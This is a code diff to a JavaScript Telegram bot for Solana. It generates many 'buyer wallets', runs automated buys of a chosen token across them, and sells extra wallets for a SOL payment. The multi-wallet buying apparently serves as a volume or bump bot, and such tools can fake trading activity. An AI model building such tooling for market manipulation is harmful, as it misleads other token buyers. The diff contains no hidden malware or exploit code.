+
+ /* GENERATE BUYERS */
+if (data === 'buyer_wallets') {
+  // Disable buttons to prevent spamming
+  if (query?.message?.message_id) {
+    await bot.editMessageReplyMarkup(
+      { inline_keyboard: [] },
+      { chat_id: chatId, message_id: query.message.message_id }
+    );
+  }
+
   return bot.sendMessage(chatId, 'Select amount:', buyerOptionsMenu());
 }
 
@@ -881,6 +1269,14 @@ if (data.startsWith('gen_')) {
   const count = parseInt(data.split('_')[1]);
   session.buyers = [];
   let out = `MAIN WALLET\n${session.mainWallet.publicKey}\n\n`;
+
+  // Disable buttons while generating
+  if (query?.message?.message_id) {
+    await bot.editMessageReplyMarkup(
+      { inline_keyboard: [] },
+      { chat_id: chatId, message_id: query.message.message_id }
+    );
+  }
 
   for (let i = 0; i < count; i++) {
     const kp = Keypair.generate();
@@ -896,44 +1292,46 @@ if (data.startsWith('gen_')) {
   await bot.sendDocument(chatId, file);
   fs.unlinkSync(file);
 
-  // ✅ Replace the "Select amount" message completely
+  // First, editable TXT prompt
   if (query?.message?.message_id) {
     await bot.editMessageText(
-      '✅ Wallets generated.',
+      '📄 Your buyer wallets TXT file is ready — download it NOW and keep it safe! 🔒',
       {
         chat_id: chatId,
-        message_id: query.message.message_id
+        message_id: query.message.message_id,
+        parse_mode: 'Markdown',
       }
     );
   }
 
-  return bot.sendMessage(chatId, '✅ Buyer wallets ready.', postBuyerMenu());
+  // Then, send the trade panel as the latest message
+  return bot.sendMessage(
+    chatId,
+    '🔥 Buyer wallets GENERATED! 🔥\n🚀 Wallets are prepped for action! 💰 *Important:* Make sure you have SOL before entering the trade panel. ⚠️',
+    postBuyerMenu()
+  );
 }
 
-  /* TRADE TOGGLE */
-  if (data === 'trade_toggle') {
+  /* ----------------- TRADE TOGGLE (pendingInput + delete) ----------------- */
+if (data === 'trade_toggle') {
   if (session.isTrading) {
     session.isTrading = false;
     if (session.sellInterval) clearInterval(session.sellInterval);
-    return bot.sendMessage(chatId, '🔴 Trading stopped.', actionMenu(session));
+    return bot.sendMessage(chatId, '🔴 Trading stopped.', postBuyerActionMenu(session));
   }
 
-  // 🚨 Check if buyer wallets exist
+  // Check if buyer wallets exist
   if (!session.buyers || session.buyers.length === 0) {
     return bot.sendMessage(chatId, '❌ No buyer wallets generated.');
   }
 
-  // 🚨 Check if wallets have usable SOL
+  // Check if wallets have usable SOL
   const feeBuffer = 0.001;
   let walletsWithBalance = 0;
 
   for (const buyer of session.buyers) {
     const solBal = await getBalance(buyer.pub);
-
-    // Wallet must afford at least minBuy + fees
-    if (solBal > session.tradeConfig.minBuy + feeBuffer) {
-      walletsWithBalance++;
-    }
+    if (solBal > session.tradeConfig.minBuy + feeBuffer) walletsWithBalance++;
   }
 
   if (walletsWithBalance === 0) {
@@ -943,28 +1341,36 @@ if (data.startsWith('gen_')) {
     );
   }
 
-  bot.sendMessage(chatId, 'Enter token mint address:');
+  // Prompt user for token mint address
+  bot.sendMessage(chatId, '➡️ Enter token mint address:');
 
-  return bot.once('message', msg => {
-  const mintInput = msg.text.trim();
+  // Set pendingInput to capture the mint address
+  session.pendingInput = {
+    type: 'trade_mint_address',
+    resolve: async (input, msg) => {
+      // 🔥 Delete user's message immediately
+      try { await bot.deleteMessage(chatId, msg.message_id); } catch (e) {}
 
-  try {
-    new PublicKey(mintInput);
-  } catch {
-    return bot.sendMessage(chatId, '❌ Invalid mint address.');
-  }
+      const mintInput = input.trim();
+      try {
+        new PublicKey(mintInput); // validate address
+      } catch {
+        return bot.sendMessage(chatId, '❌ Invalid mint address.');
+      }
 
-  session.tradeConfig.contractAddress = mintInput;
-  session.isTrading = true;
+      session.tradeConfig.contractAddress = mintInput;
+      session.isTrading = true;
 
-  performRealTrading(session, chatId);
+      // Start trading logic
+      performRealTrading(session, chatId);
 
-    bot.sendMessage(
-      chatId,
-      `🟢 Trading started.\nActive wallets: ${walletsWithBalance}`,
-      postBuyerActionMenu(session)
-    );
-  });
+      bot.sendMessage(
+        chatId,
+        `🟢 Trading started.\nActive wallets: ${walletsWithBalance}`,
+        postBuyerActionMenu(session)
+      );
+    }
+  };
 }
 
 /* --------------- REAL BUY TRADING --------------- */
@@ -1040,14 +1446,24 @@ async function performRealTrading(session, chatId) {
   startSellMonitor(session, chatId);
 }
 
-/* TRANSFER NOW */
+/* — TRANSFER NOW */
 if (data === 'auto_transfer') {
+  const session = sessions[chatId];
+
   if (!session.mainWallet) {
     return bot.sendMessage(chatId, '❌ Create or import a wallet first.');
   }
 
   if (!session.addWalletCount || !session.addWalletPrice) {
     return bot.sendMessage(chatId, '❌ No wallet purchase in progress.');
+  }
+
+  // ✅ Vanish inline buttons immediately to prevent spamming
+  if (query?.message?.message_id) {
+    await bot.editMessageReplyMarkup(
+      { inline_keyboard: [] },
+      { chat_id: chatId, message_id: query.message.message_id }
+    );
   }
 
   try {
@@ -1069,9 +1485,11 @@ if (data === 'auto_transfer') {
       })
     );
 
+    // ✅ Attempt payment
     await sendAndConfirmTransaction(connection, tx, [sender]);
+    await new Promise(r => setTimeout(r, 100));
 
-    // ✅ Payment success — generate wallets
+    // ✅ Payment successful — generate wallets
     let output = '';
     for (let i = 0; i < session.addWalletCount; i++) {
       const kp = Keypair.generate();
@@ -1087,14 +1505,26 @@ if (data === 'auto_transfer') {
     await bot.sendDocument(chatId, file);
     fs.unlinkSync(file);
 
-    bot.sendMessage(chatId, '🎉 Wallets generated successfully.');
+    // ✅ Show success message with number of wallets generated
+    await bot.sendMessage(
+      chatId,
+      `🎉 Wallets generated successfully!\n\n` +
+      `👥 Number of wallets generated: ${session.addWalletCount}`,
+      { parse_mode: 'Markdown' }
+    );
 
+    // Clear session addWallet data
     session.addWalletCount = null;
     session.addWalletPrice = null;
 
+    // ✅ Switch panel to Trade Panel
+    await bot.sendMessage(chatId, '🚀 Back to Trade Panel', actionMenu(session));
+
   } catch (err) {
     console.log(err);
-    bot.sendMessage(chatId, '❌ Payment failed. Not enough Sol');
+
+    // ❌ Payment failed — stay in Bot Settings
+    await bot.sendMessage(chatId, '❌ Payment failed. Not enough SOL', botSettingsPanel());
   }
 }
 
@@ -1360,49 +1790,6 @@ async function sellAllPositions(session, chatId) {
   );
 }
 
-/* --------------- REQUEST TRANSFER RECEIVER --------------- */
-function requestTransferReceiver(session, chatId) {
-  bot.sendMessage(
-    chatId,
-    'Enter the SOL address where ALL buyer wallet funds will be transferred:'
-  );
-
-  bot.once('message', async msg => {
-    let receiver;
-
-    try {
-      receiver = new PublicKey(msg.text.trim());
-    } catch {
-      return bot.sendMessage(chatId, '❌ Invalid SOL address.');
-    }
-
-    // Filter wallets that actually have transferable SOL
-    const rentBuffer = 0.002;
-    const eligibleWallets = [];
-
-    for (const buyer of session.buyers) {
-      const solBal = await getBalance(buyer.pub);
-      if (solBal > rentBuffer) {
-        eligibleWallets.push(buyer);
-      }
-    }
-
-    if (eligibleWallets.length === 0) {
-      return bot.sendMessage(
-        chatId,
-        '❌ No buyer wallets have transferable SOL.'
-      );
-    }
-
-    await transferAllToAddress(
-      session,
-      chatId,
-      receiver,
-      eligibleWallets
-    );
-  });
-}
-
 /* --------------- TRANSFER TO ADDRESS --------------- */
 async function transferAllToAddress(session, chatId, receiverPubkey, buyers) {
   const rentBuffer = 0.002;
@@ -1459,5 +1846,3 @@ async function transferAllToAddress(session, chatId, receiverPubkey, buyers) {
   );
 }
 });
-
-
